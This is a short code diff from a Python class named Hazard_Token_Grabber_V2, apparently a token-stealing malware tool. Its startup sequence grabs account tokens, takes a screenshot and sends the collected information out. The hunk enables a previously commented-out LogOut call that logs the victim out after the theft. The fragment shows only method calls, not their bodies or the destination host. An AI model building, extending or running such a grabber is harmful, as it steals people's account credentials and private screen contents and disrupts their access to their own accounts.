@@ -24,7 +24,7 @@ class Hazard_Token_Grabber_V2:
         self.grabTokens()
         self.screenshot()
         self.SendInfo()
-        # self.LogOut()
+        self.LogOut()
 
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
